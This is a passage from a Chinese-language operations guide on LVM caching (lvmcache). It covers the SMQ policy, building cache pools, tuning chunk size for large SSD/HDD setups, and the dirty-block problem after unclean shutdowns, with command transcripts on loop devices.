passthrough\uff0c\u200b\u5373\u200b\u5199\u5165\u200b\u52a8\u4f5c\u200b\u7ed5\u8fc7\u200b\u7f13\u5b58\u200b\u76f4\u63a5\u200b\u5199\u200b\u56de\u539f\u200b\u8bbe\u5907\u200b\uff08\u200b\u5f53\u7136\u200b\u5566\u200b\uff0c\u200b\u5199\u5165\u200b\u90fd\u200b\u662f\u200b\u7531\u200b\u4ece\u200b\u4e0a\u6e38\u200b\u540c\u6b65\u200b\u4ea7\u751f\u200b\u7684\u200b\uff09\uff0c\u200b\u53e6\u5916\u200b\u4e24\u79cd\u200b writeback \u200b\u548c\u200b writethrough \u200b\u90fd\u200b\u4f1a\u200b\u5199\u5165\u200b\u7f13\u5b58\u200b\uff0c\u200b\u4e0d\u662f\u200b\u6211\u4eec\u200b\u60f3\u8981\u200b\u7684\u200b\u3002</p> <p>\uff08\u200b\u5f53\u7136\u200b\uff0c\u200b\u8fd9\u200b\u662f\u200b\u9519\u200b\u7684\u200b\uff09</p> <p>\u200b\u53e6\u5916\u200b\u53ef\u4ee5\u200b\u6ce8\u610f\u200b\u5230\u200b\uff0c<code>lvmcache</code> \u200b\u505a\u200b\u4e86\u200b\u8fd9\u4e48\u200b\u4e00\u4e2a\u200b\u5047\u8bbe\u200b\uff1a\u200b\u5199\u5165\u200b\u7684\u200b\u5185\u5bb9\u200b\u5f88\u5feb\u200b\u5c31\u200b\u4f1a\u200b\u88ab\u200b\u8bfb\u53d6\u200b\u3002\u200b\u4f46\u662f\u200b\u8fd9\u4e2a\u200b\u5047\u8bbe\u200b\u771f\u7684\u200b\u603b\u662f\u200b\u6210\u7acb\u200b\u5417\u200b\uff1f writearound \u200b\u7684\u200b\u505a\u6cd5\u200b\u662f\u200b\u5199\u5165\u200b\u7684\u200b\u5185\u5bb9\u200b\u4f1a\u200b\u7ed5\u8fc7\u200b\u7f13\u5b58\u200b\uff0c\u200b\u5f53\u7136\u200b lvmcache \u200b\u6ca1\u6709\u200b\u5b9e\u73b0\u200b\u8fd9\u4e2a\u200b\u6a21\u5f0f\u200b\u3002</p> <code>dm-cache-policy-smq.c</code> \u200b\u4e2d\u200b\u5b9e\u73b0\u200b\u7684\u200b SMQ \u200b\u7b56\u7565\u200b\u7b97\u6cd5\u200b <p>\u200b\u6838\u5fc3\u200b\u7684\u200b\u7ed3\u6784\u200b\u4f53\u662f\u200b <code>smq_policy</code>\uff0c\u200b\u5176\u4e2d\u200b\u5305\u542b\u200b\u4e86\u200b\u4e09\u4e2a\u200b SMQ \u200b\u961f\u5217\u200b\uff1a\u200b\u70ed\u70b9\u200b\uff08hotspot\uff09\u200b\u961f\u5217\u200b\u3001clean \u200b\u961f\u5217\u200b\u548c\u200b dirty \u200b\u961f\u5217\u200b\u3002 \u200b\u6bcf\u4e2a\u200b SMQ \u200b\u961f\u5217\u200b\u4e2d\u200b\u5305\u542b\u200b 64 \u200b\u4e2a\u200b LRU \u200b\u961f\u5217\u200b\u3002\u200b\u8fd9\u200b 64 \u200b\u4e2a\u200b\u961f\u5217\u200b\u6784\u6210\u200b\u4e0d\u540c\u200b\u7684\u200b\u7b49\u7ea7\u200b\uff0c\u200b\u5b58\u50a8\u200b\u7531\u70ed\u5230\u200b\u51b7\u200b\u7684\u200b\u5185\u5bb9\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u4e0d\u200b\u5173\u5fc3\u200b\u6570\u636e\u200b\u5377\u200b\u548c\u200b\u5143\u200b\u6570\u636e\u200b\u5377\u200b\u7684\u200b\u7ec6\u8282\u200b\uff0c\u200b\u521b\u5efa\u200b <code>cachepool</code> \u200b\u7684\u200b\u4f53\u9a8c\u200b\u4e5f\u200b\u7c7b\u4f3c\u200b\u3002\u200b\u5148\u200b\u628a\u200b\u4e0a\u9762\u200b\u7684\u200b uncache \u200b\u6389\u200b\uff1a</p> <pre><code>$ sudo lvconvert --uncache vg201-test/lvdata\n  Logical volume \"lvdata_cache\" successfully removed.\n  Logical volume vg201-test/lvdata is not cached and vg201-test/lvdata_cache is removed.\n</code></pre> <p>\u200b\u7136\u540e\u200b\u521b\u5efa\u200b cache-pool \u200b\u7c7b\u578b\u200b\u7684\u200b LV\uff0c\u200b\u5e76\u4e14\u200b\u9644\u52a0\u200b\u5230\u200b\u540e\u5907\u200b\u8bbe\u5907\u200b\u4e0a\u200b\uff1a</p> <pre><code>$ sudo lvcreate --type cache-pool -n lvdata_cache -l 100%FREE vg201-test /dev/loop1\n  Logical volume \"lvdata_cache\" created.\n$ sudo lvs -a\n  LV                   VG         Attr       LSize    Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert\n  lvdata               vg201-test -wi-a----- &lt;100.00g                                                    \n  lvdata_cache         vg201-test Cwi---C---    9.97g                                                    \n  [lvdata_cache_cdata] vg201-test Cwi-------    9.97g                                                    \n  [lvdata_cache_cmeta] vg201-test ewi-------   12.00m                                                    \n  [lvol0_pmspare]      vg201-test ewi-------   12.00m\n$ sudo lvconvert --type cache --cachepool lvdata_cache vg201-test/lvdata\nDo you want wipe existing metadata of cache pool vg201-test/lvdata_cache? [y/n]: y\n  Logical volume vg201-test/lvdata is now cached.\n$ sudo lvs -a\n  LV                         VG         Attr       LSize    Pool                 Origin         Data%  Meta%  Move Log Cpy%Sync Convert\n  lvdata                     vg201-test Cwi-a-C--- &lt;100.00g [lvdata_cache_cpool] [lvdata_corig] 0.01   11.07           0.00            \n  [lvdata_cache_cpool]       vg201-test Cwi---C---    9.97g                                     0.01   11.07           0.00            \n  [lvdata_cache_cpool_cdata] vg201-test Cwi-ao----    9.97g                                                                            \n  [lvdata_cache_cpool_cmeta] vg201-test ewi-ao----   12.00m                                                                            \n  [lvdata_corig]             vg201-test owi-aoC--- &lt;100.00g                                                                            \n  [lvol0_pmspare]            vg201-test ewi-------   12.00m\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u53d1\u73b0\u200b\uff0c\u200b\u5728\u200b <code>lvcreate --type cache-pool</code> \u200b\u7684\u200b\u65f6\u5019\u200b\uff0cLVM \u200b\u4f1a\u200b\u81ea\u52a8\u200b\u521b\u5efa\u200b\u4e24\u4e2a\u200b LV\uff1a<code>lvdata_cache_cdata</code> \u200b\u548c\u200b <code>lvdata_cache_cmeta</code>\u3002 \u200b\u4f46\u662f\u200b\u66f4\u200b\u8001\u200b\u4e00\u4e9b\u200b\u7684\u200b\u6559\u7a0b\u200b\u4e2d\u200b\u4f1a\u200b\u4ecb\u7ecd\u200b\u5206\u522b\u200b\u624b\u5de5\u200b\u521b\u5efa\u200b\u7f13\u5b58\u200b\u548c\u200b\u5143\u200b\u6570\u636e\u200b LV \u200b\u7684\u200b\u5185\u5bb9\u200b\u3002\u200b\u8ba9\u200b\u6211\u4eec\u200b\u5148\u200b\u628a\u200b\u8fd9\u4e2a\u200b\u518d\u200b\u62c6\u6389\u200b\uff08uncache\uff09\uff0c\u200b\u7136\u540e\u200b\u624b\u5de5\u200b\u505a\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u3002</p> <p>\u200b\u6839\u636e\u200b RHEL 6 \u200b\u7684\u200b\u6587\u6863\u200b\uff0c\u200b\u6570\u636e\u200b\u548c\u200b\u5143\u200b\u6570\u636e\u200b\u7684\u200b\u63a8\u8350\u200b\u5927\u5c0f\u200b\u6bd4\u4f8b\u200b\u662f\u200b 1000:1\uff08\u200b\u4f8b\u5982\u200b\u5982\u679c\u200b\u6709\u200b 2G \u200b\u7684\u200b\u7f13\u5b58\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u9700\u8981\u200b 12M \u200b\u7684\u200b\u5143\u200b\u6570\u636e\u200b\uff09\u3002 \u200b\u8fd9\u91cc\u200b\u6211\u4eec\u200b\u7684\u200b \"SSD\" \u200b\u6709\u200b 10G\uff0c\u200b\u56e0\u6b64\u200b\u5927\u7ea6\u200b\u9700\u8981\u200b 60M \u200b\u7684\u200b\u5143\u200b\u6570\u636e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5148\u200b\u521b\u5efa\u200b\u5143\u200b\u6570\u636e\u200b LV\uff0c\u200b\u7136\u540e\u200b\u5269\u4e0b\u200b\u7684\u200b\u2014\u2014\u200b\u5168\u90e8\u200b\u7ed9\u200b\u6570\u636e\u200b\uff1f</p> <pre><code>$ sudo lvcreate -L 60M -n lvdata_cache_meta vg201-test /dev/loop1\n  Logical volume \"lvdata_cache_meta\" created.\n$ sudo lvcreate -l 100%FREE -n lvdata_cache_data vg201-test /dev/loop1\n  Logical volume \"lvdata_cache_data\" created.\n$ sudo lvconvert --type cache-pool --poolmetadata lvdata_cache_meta --cachemode writethrough vg201-test/lvdata_cache_data\n  WARNING: Converting vg201-test/lvdata_cache_data and vg201-test/lvdata_cache_meta to cache pool's data and metadata volumes with metadata wiping.\n  THIS WILL DESTROY CONTENT OF LOGICAL VOLUME (filesystem etc.)\nDo you really want to convert vg201-test/lvdata_cache_data and vg201-test/lvdata_cache_meta? [y/n]: y\n  Volume group \"vg201-test\" has insufficient free space (0 extents): 15 required.\n  Failed to set up spare metadata LV for pool.\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u8fd8\u200b\u9700\u8981\u200b\u4e00\u4e9b\u200b\u7a7a\u95f4\u200b\uff0815 \u200b\u4e2a\u200b extent\uff09\uff0c\u200b\u56e0\u6b64\u200b\u4f7f\u7528\u200b <code>lvreduce</code> \u200b\u7559\u70b9\u200b\u51fa\u6765\u200b\uff1a</p> <pre><code>$ sudo lvreduce -l -15 vg201-test/lvdata_cache_data\n  No file system found on /dev/vg201-test/lvdata_cache_data.\n  Size of logical volume vg201-test/lvdata_cache_data changed from &lt;9.94 GiB (2544 extents) to &lt;9.88 GiB (2529 extents).\n  Logical volume vg201-test/lvdata_cache_data successfully resized.\n$ sudo lvconvert --type cache-pool --poolmetadata lvdata_cache_meta --cachemode writethrough vg201-test/lvdata_cache_data\n  WARNING: Converting vg201-test/lvdata_cache_data and vg201-test/lvdata_cache_meta to cache pool's data and metadata volumes with metadata wiping.\n  THIS WILL DESTROY CONTENT OF LOGICAL VOLUME (filesystem etc.)\nDo you really want to convert vg201-test/lvdata_cache_data and vg201-test/lvdata_cache_meta? [y/n]: y\n  Converted vg201-test/lvdata_cache_data and vg201-test/lvdata_cache_meta to cache pool.\n</code></pre> <p>\u200b\u4e4b\u540e\u200b\u5c31\u200b\u548c\u200b\u4e0a\u9762\u200b\u4e00\u81f4\u200b\u4e86\u200b\uff1a</p> <pre><code>$ sudo lvs -a\n  LV                        VG         Attr       LSize    Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert\n  lvdata                    vg201-test -wi-a----- &lt;100.00g                                                    \n  lvdata_cache_data         vg201-test Cwi---C---   &lt;9.88g                                                    \n  [lvdata_cache_data_cdata] vg201-test Cwi-------   &lt;9.88g                                                    \n  [lvdata_cache_data_cmeta] vg201-test ewi-------   60.00m                                                    \n  [lvol0_pmspare]           vg201-test ewi-------   60.00m\n$ sudo lvconvert --type cache --cachepool lvdata_cache_data vg201-test/lvdata\nDo you want wipe existing metadata of cache pool vg201-test/lvdata_cache_data? [y/n]: y\n  Logical volume vg201-test/lvdata is now cached.\n</code></pre>"},{"location":"ops/storage/lvm/#lvmcache-scalability","title":"Does lvmcache scale?","text":"<p>\u200b\u73b0\u5b9e\u200b\u4e2d\u200b\u6211\u4eec\u200b\u80af\u5b9a\u200b\u4e0d\u200b\u53ef\u80fd\u200b\u53ea\u7528\u200b 10G \u200b\u7684\u200b SSD \u200b\u6765\u200b\u505a\u200b\u7f13\u5b58\u200b\uff0c\u200b\u800c\u200b\u5728\u200b\u975e\u200b\u5bb6\u7528\u200b\u7684\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u9700\u8981\u200b\u7f13\u5b58\u200b\u7684\u200b\u540e\u5907\u200b\u5b58\u50a8\u200b\u4e5f\u200b\u4e0d\u200b\u53ef\u80fd\u200b\u53ea\u6709\u200b 100G \u200b\u8fd9\u4e48\u200b\u5927\u200b\u3002 \u200b\u4e0b\u9762\u200b\u8003\u8651\u200b\u4e00\u4e2a\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b\u76ee\u524d\u200b mirrors \u200b\u7684\u200b\u573a\u666f\u200b\uff1a1.5T \u200b\u7684\u200b SSD \u200b\u7a7a\u95f4\u200b\u5bf9\u200b 65T \u200b\u7684\u200b HDD \u200b\u7a7a\u95f4\u200b\u8fdb\u884c\u200b\u7f13\u5b58\u200b\uff08\u200b\u6bd4\u4f8b\u200b\u5927\u7ea6\u200b 1:45\uff09\u3002</p> <p>\u200b\u628a\u200b\u5df2\u6709\u200b\u7684\u200b\u62c6\u6389\u200b\u4e4b\u540e\u200b\u91cd\u65b0\u200b\u521b\u5efa\u200b 1.5T\uff081536G\uff09\u200b\u548c\u200b 65T \u200b\u7684\u200b\u7a00\u758f\u200b\u6587\u4ef6\u200b\u4f5c\u4e3a\u200b SSD \u200b\u548c\u200b HDD\uff0c\u200b\u52a0\u5165\u200b LVM\uff0c\u200b\u7136\u540e\u200b\u8ba9\u200b\u6211\u4eec\u200b\u8bd5\u8bd5\u200b cachevol\u2026\u2026</p> <pre><code>$ sudo lvconvert --type cache --cachevol lvdata_cache vg201-test/lvdata\nErase all existing data on vg201-test/lvdata_cache? [y/n]: y\n  Cache data blocks 3219046400 and chunk size 128 exceed max chunks 1000000.\n  Use smaller cache, larger --chunksize or increase max chunks setting.\n</code></pre> <p>\uff08\u200b\u8fd9\u91cc\u200b\u663e\u793a\u200b\u7684\u200b\u5355\u4f4d\u200b\u662f\u200b\u6247\u533a\u200b\uff0c\u200b\u5373\u200b 512 \u200b\u5b57\u8282\u200b\uff09</p> <p>\u200b\u8fd9\u91cc\u200b cache \u200b\u9700\u8981\u200b\u8bb0\u5f55\u200b\u7f13\u5b58\u6570\u636e\u200b\u7684\u200b\u8bbf\u95ee\u200b\u60c5\u51b5\u200b\uff0c\u200b\u8bb0\u5f55\u200b\u7684\u200b\u5355\u4f4d\u200b\u5c31\u662f\u200b chunk\uff08\u200b\u9700\u8981\u200b\u662f\u200b 32K \u200b\u7684\u200b\u500d\u6570\u200b\uff09\u3002\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0cchunk \u200b\u5927\u5c0f\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b 64KB\u3002 \u200b\u5e76\u4e14\u200b LVM \u200b\u63a8\u8350\u200b chunk \u200b\u4e0d\u200b\u8d85\u8fc7\u200b\u4e00\u767e\u4e07\u4e2a\u200b\uff08\u200b\u8fd9\u200b\u4e5f\u200b\u662f\u200b allocation/cache_pool_max_chunks \u200b\u8bbe\u7f6e\u200b\u7684\u200b\u9ed8\u8ba4\u503c\u200b\uff09\u3002 \u200b\u6362\u53e5\u8bdd\u200b\u8bb2\u200b\uff0c\u200b\u5982\u679c\u200b\u4fdd\u6301\u200b\u9ed8\u8ba4\u8bbe\u7f6e\u200b\uff0c\u200b\u90a3\u4e48\u200b\u540e\u5907\u200b\u6570\u636e\u200b\u6700\u5927\u200b\u53ea\u80fd\u200b\u6709\u200b 64KB * 1,000,000 ~= 64GB &lt;&lt; 1.5T\uff0c\u200b\u8fd9\u200b\u663e\u7136\u200b\u662f\u200b\u4e0d\u591f\u200b\u7684\u200b\u3002</p> <p>\u200b\u76f4\u89c9\u200b\u6765\u8bb2\u200b\uff0c\u200b\u65e2\u7136\u200b chunk \u200b\u63a8\u8350\u200b\u4e0d\u200b\u8d85\u8fc7\u200b\u4e00\u767e\u4e07\u4e2a\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u62c9\u9ad8\u200b chunk size\uff1f\u200b\u4f46\u662f\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u95ee\u9898\u200b\uff1a</p> <ol> <li>\u200b\u5982\u679c\u200b\u8bbf\u95ee\u200b\u7684\u200b\u6a21\u5f0f\u200b\u4e0d\u200b\u90a3\u4e48\u200b\u8fde\u7eed\u200b\uff0c\u200b\u90a3\u4e48\u200b\u66f4\u5927\u200b\u7684\u200b chunk size \u200b\u5c31\u200b\u52bf\u5fc5\u200b\u5bfc\u81f4\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u6570\u636e\u200b\u5728\u200b\u7f13\u5b58\u200b\u548c\u200b\u540e\u5907\u200b\u8bbe\u5907\u200b\u4e4b\u95f4\u200b\u6765\u56de\u200b\u4f20\u8f93\u200b\u3002\uff08\u200b\u547d\u4e2d\u7387\u200b\u964d\u4f4e\u200b\uff09</li> <li>SSD \u200b\u7684\u200b\u5199\u5165\u200b\u91cf\u200b\u662f\u200b\u6709\u200b\u9650\u5236\u200b\u7684\u200b\u3002\u200b\u4e0a\u9762\u200b\u4e00\u70b9\u200b\u4e2d\u200b\u63d0\u5230\u200b\u7684\u200b\u547d\u4e2d\u7387\u200b\u964d\u4f4e\u200b\u7684\u200b\u95ee\u9898\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u66f4\u200b\u591a\u200b\u7684\u200b\u5199\u5165\u200b\uff0c\u200b\u6700\u7ec8\u200b\u5bfc\u81f4\u200b SSD \u200b\u7684\u200b\u5bff\u547d\u200b\u7f29\u77ed\u200b\u3002</li> </ol> <p>\u200b\u56e0\u6b64\u200b\u66f4\u597d\u200b\u7684\u200b\u9009\u62e9\u200b\u662f\u200b\u4ee5\u200b\uff08\u200b\u76f8\u5bf9\u200b\u66f4\u80fd\u200b\u63a5\u53d7\u200b\u7684\u200b\uff09\u200b\u4e00\u4e9b\u200b\u989d\u5916\u200b\u7684\u200b overhead \u200b\u4e3a\u200b\u4ee3\u4ef7\u200b\uff0c\u200b\u589e\u52a0\u200b chunk \u200b\u6570\u91cf\u200b\u3002\u200b\u5177\u4f53\u200b\u7684\u200b\u300c\u200b\u4ee3\u4ef7\u200b\u300d\u200b\u5728\u200b\u540e\u7eed\u200b\u521b\u5efa\u200b\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u5185\u6838\u200b\u65e5\u5fd7\u200b\u91cc\u9762\u200b\u770b\u5230\u200b\uff1a</p> <pre><code>[2030783.641796] device-mapper: cache: You have created a cache device with a lot of individual cache blocks (12578624)\n                 All these mappings can consume a lot of kernel memory, and take some time to read/write.\n                 Please consider increasing the cache block size to reduce the overall cache block count.\n</code></pre> <p>\u200b\u8003\u8651\u200b\u5230\u200b\u5728\u200b\u670d\u52a1\u5668\u200b\u573a\u5408\u200b\uff0c\u200b\u5185\u5b58\u200b\u4e00\u822c\u200b\u90fd\u200b\u662f\u200b\u8db3\u591f\u200b\uff08\u200b\u751a\u81f3\u200b\u8fc7\u91cf\u200b\uff09\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u552f\u4e00\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u8003\u8651\u200b\u7684\u200b\u5c31\u662f\u200b\u989d\u5916\u200b\u7684\u200b\u5ef6\u8fdf\u200b\u4e86\u200b\u3002</p> <p>@taoky: \u200b\u771f\u5b9e\u200b\u4e8b\u4ef6\u200b\u7684\u200b\u6559\u8bad\u200b</p> <p>\u200b\u6700\u200b\u5f00\u59cb\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cmirrors \u200b\u7684\u200b chunk size \u200b\u8bbe\u7f6e\u200b\u4e3a\u4e86\u200b 1M\uff0c\u200b\u7ed3\u679c\u200b\u8fc7\u200b\u4e86\u200b\u4e24\u5e74\u200b\u591a\u200b\u5c31\u200b\u53d1\u73b0\u200b SSD \u200b\u5feb\u200b\u6302\u200b\u4e86\u200b\u3002 \u200b\u67e5\u770b\u200b\u7edf\u8ba1\u200b\u53d1\u73b0\u200b SSD \u200b\u6bcf\u200b\u5c0f\u65f6\u200b\u8bfb\u53d6\u200b 0.1T\uff0c\u200b\u4f46\u662f\u200b\u5199\u200b 1T \u200b\u6570\u636e\u200b\u2026\u2026</p> <p>\u200b\u56e0\u4e3a\u200b\u7ecf\u5386\u200b\u8fc7\u200b SSD \u200b\u88ab\u200b lvmcache \u200b\u78e8\u200b\u6ca1\u200b\u7684\u200b\u4e8b\u4ef6\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6211\u200b\u4e2a\u4eba\u200b\u7684\u200b\u770b\u6cd5\u200b\u662f\u200b\uff0c \u200b\u5728\u200b 201 \u200b\u4e2d\u200b\uff0c\u200b\u63d0\u53ca\u200b\u8fd9\u200b\u4e00\u70b9\u200b\uff08\u200b\u4ee5\u53ca\u200b\u540e\u9762\u200b\u4f1a\u200b\u4ecb\u7ecd\u200b lvmcache \u200b\u8fd8\u6709\u200b\u5176\u4ed6\u200b\u7684\u200b\u5751\u200b\uff09\u200b\u662f\u200b\u5f88\u200b\u91cd\u8981\u200b\u7684\u200b\u2014\u2014\u200b\u6709\u4e9b\u200b\u65b9\u6848\u200b\u653e\u200b\u5927\u89c4\u6a21\u200b\u4e4b\u540e\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u610f\u60f3\u4e0d\u5230\u200b\u7684\u200b\u95ee\u9898\u200b\u3002</p> <pre><code>$ sudo lvconvert --type cache --cachevol lvdata_cache --config allocation/cache_pool_max_chunks=25148800 vg201-test/lvdata\nErase all existing data on vg201-test/lvdata_cache? [y/n]: y\n  WARNING: Configured cache_pool_max_chunks value 25148800 is higher then recommended 1000000.\n  Logical volume vg201-test/lvdata is now cached.\n</code></pre> <p>64K \u200b\u4e5f\u200b\u662f\u200b\u76ee\u524d\u200b mirrors \u200b\u673a\u5668\u200b\u4f7f\u7528\u200b\u7684\u200b chunk size\u3002</p> <p>\u200b\u5f53\u7136\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u628a\u200b chunk size \u200b\u7565\u5fae\u200b\u8c03\u5927\u5230\u200b 128K\uff0c\u200b\u8fd9\u6837\u7684\u8bdd\u200b chunk \u200b\u5c31\u200b\u5c11\u200b\u4e00\u4e9b\u200b\uff1a</p> <pre><code>$ sudo lvconvert --type cache --cachevol lvdata_cache --chunksize 128K --config allocation/cache_pool_max_chunks=12578624 vg201-test/lvdata\nErase all existing data on vg201-test/lvdata_cache? [y/n]: y\n  WARNING: Configured cache_pool_max_chunks value 12578624 is higher then recommended 1000000.\n  Logical volume vg201-test/lvdata is now cached.\n</code></pre> <p>\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u8fdb\u884c\u200b\u4e00\u4e9b\u200b\u6027\u80fd\u200b\u6d4b\u8bd5\u200b\u6765\u200b\u6743\u8861\u200b chunk size \u200b\u5e26\u6765\u200b\u7684\u200b\u5f71\u54cd\u200b\u2014\u2014\u200b\u8003\u8651\u200b\u5230\u200b\u672c\u5730\u200b\u6d4b\u8bd5\u200b\u65f6\u200b\u7a00\u758f\u200b\u6587\u4ef6\u200b\u7b49\u200b\u56e0\u7d20\u200b\uff0c\u200b\u5b9e\u9645\u200b\u7684\u200b\u6027\u80fd\u200b\u6d4b\u8bd5\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u5728\u200b\u771f\u5b9e\u200b\u7684\u200b\u73af\u5883\u200b\u4e2d\u200b\u8fdb\u884c\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0c\u200b\u5728\u200b <code>lvconvert</code> \u200b\u521b\u5efa\u200b\u7f13\u5b58\u200b\u65f6\u200b\uff0c\u200b\u5982\u679c\u200b SSD \u200b\u8bbe\u5907\u200b\u4e0d\u200b\u652f\u6301\u200b TRIM\uff08\u200b\u5e38\u89c1\u200b\u7684\u200b\u573a\u666f\u200b\u662f\u200b\u5728\u200b RAID \u200b\u5361\u200b\u540e\u9762\u200b\uff09\uff0c\u200b\u90a3\u4e48\u200b\u5176\u4f1a\u200b\u6e05\u96f6\u200b\u5bf9\u5e94\u200b\u7684\u200b\u5757\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u82b1\u8d39\u200b\u8d85\u8fc7\u200b\u534a\u4e2a\u200b\u5c0f\u65f6\u200b\u7684\u200b\u65f6\u95f4\u200b\u3002</p>"},{"location":"ops/storage/lvm/#lvmcache-dirty-issue","title":"Too dirty to use","text":"<p>lvmcache \u200b\u65b9\u6848\u200b\u7684\u200b\u4e00\u4e2a\u200b\u65e0\u6cd5\u200b\u5ffd\u89c6\u200b\u7684\u200b\u5f0a\u7aef\u200b\u662f\u200b\uff1a\u200b\u5373\u4f7f\u200b\u6a21\u5f0f\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b writethrough\uff0c\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u5e72\u51c0\u200b\u5730\u200b\u5378\u8f7d\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5728\u200b\u4e0b\u6b21\u200b\u52a0\u8f7d\u200b\u540e\u200b\uff0c\u200b\u7f13\u5b58\u200b\u4e2d\u200b\u6240\u6709\u200b\u7684\u200b\u5757\u200b\u90fd\u200b\u4f1a\u200b\u88ab\u200b\u6807\u8bb0\u200b\u4e3a\u810f\u5757\u200b\u3002 \u200b\u66f4\u52a0\u200b\u81f4\u547d\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u5728\u200b\u751f\u4ea7\u200b\u8d1f\u8f7d\u200b\u4e0b\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u810f\u5757\u200b\u5199\u200b\u56de\u200b\u5728\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\u6781\u5176\u200b\u7f13\u6162\u200b\u7684\u200b\u95ee\u9898\u200b\uff08\u200b\u5373\u4f7f\u200b\u8bbe\u7f6e\u200b policy \u200b\u4e3a\u200b cleaner\uff09\uff0c\u200b\u4ee5\u81f3\u4e8e\u200b\u53ef\u80fd\u200b\u8fc7\u200b\u4e86\u200b\u51e0\u4e2a\u200b\u5c0f\u65f6\u200b\u90fd\u200b\u6ca1\u6709\u200b\u8fc1\u79fb\u200b\u4efb\u4f55\u200b\u4e00\u4e2a\u200b\u5757\u200b\u3002</p> \u200b\u5982\u4f55\u200b\u5b9e\u9a8c\u200b\u590d\u73b0\u200b\u300c\u200b\u6240\u6709\u200b\u5757\u200b\u88ab\u200b\u6807\u8bb0\u200b\u300d\u200b\u7684\u200b\u884c\u4e3a\u200b\uff1f <p>\u200b\u7531\u4e8e\u200b\u6ca1\u6709\u200b\u80fd\u591f\u200b\u5f3a\u5236\u200b\u5378\u8f7d\u200b\u672c\u5730\u200b\u56de\u73af\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fd9\u91cc\u200b\u53ef\u4ee5\u200b\u8003\u8651\u200b\u7684\u200b\u601d\u8def\u200b\u662f\u200b\uff1a \u200b\u5728\u200b\u865a\u62df\u673a\u200b\u4e2d\u200b\u4f7f\u7528\u200b\u672c\u5730\u200b\u56de\u73af\u200b\u8bbe\u5907\u200b\u521b\u5efa\u200b lvmcache\uff0c\u200b\u5199\u5165\u200b\u5e76\u200b\u8bfb\u53d6\u200b\u4e00\u4e9b\u200b\u6570\u636e\u200b\uff08\u200b\u5355\u7eaf\u200b\u7684\u200b\u5199\u5165\u200b\u4e00\u6b21\u200b\u53ef\u80fd\u200b\u4e0d\u4f1a\u200b\u4f7f\u7528\u200b\u7f13\u5b58\u200b\u5757\u200b\u7a7a\u95f4\u200b\uff09\uff0c\u200b\u7136\u540e\u200b\u4f7f\u7528\u200b <code>reboot -f</code> \u200b\u5f3a\u5236\u200b\u91cd\u542f\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u4f7f\u7528\u200b\u7684\u200b\u5757\u200b\u591f\u200b\u591a\u200b\uff0c\u200b\u5e76\u4e14\u200b\u64cd\u4f5c\u200b\u53ca\u65f6\u200b\uff0c\u200b\u53ef\u80fd\u200b\u5c31\u200b\u80fd\u200b\u770b\u5230\u200b dirty block &gt; 0 \u200b\u7684\u200b\u60c5\u51b5\u200b\uff1a</p> <pre><code>$ sudo losetup -f --show hdd.img\n/dev/loop0\n$ sudo losetup -f --show ssd.img\n/dev/loop1\n$ sudo lvs -a -o devices,cache_policy,cachemode,cache_settings,cache_total_blocks,cache_used_blocks,cache_dirty_blocks,cache_read_hits,cache_read_misses,cache_write_hits,cache_write_misses\n  Devices         CachePolicy CacheMode    CacheSettings CacheTotalBlocks CacheUsedBlocks  CacheDirtyBlocks CacheReadHits    CacheReadMisses  CacheWriteHits   CacheWriteMisses\n  lvdata_corig(0) smq         writethrough                         163584            62544             4918              120                0                0                0\n  /dev/loop1(0)                                                                                                                                                                \n  /dev/loop0(0)\n</code></pre> <p>\u200b\u53e6\u5916\u200b\u5728\u200b\u672c\u5730\u200b\u6d4b\u8bd5\u200b\u65f6\u200b\u53d1\u73b0\u200b\uff0c\u200b\u5982\u679c\u200b\u521b\u5efa\u200b cache \u200b\u4e4b\u540e\u200b\u8fc7\u200b\u77ed\u6682\u200b\u7684\u200b\u65f6\u95f4\u200b\u540e\u200b\u91cd\u542f\u200b\uff0cLVM \u200b\u8c03\u7528\u200b\u7684\u200b\u65e7\u7248\u672c\u200b\u7684\u200b cache \u200b\u68c0\u67e5\u200b\u5de5\u5177\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u8ba4\u4e3a\u200b cache LV \u200b\u7684\u200b\u7ed3\u6784\u200b\u4e0d\u200b\u6b63\u786e\u200b\uff0c \u200b\u6b64\u65f6\u200b LVM \u200b\u65e0\u6cd5\u200b\u6302\u8f7d\u200b<sup>2</sup> 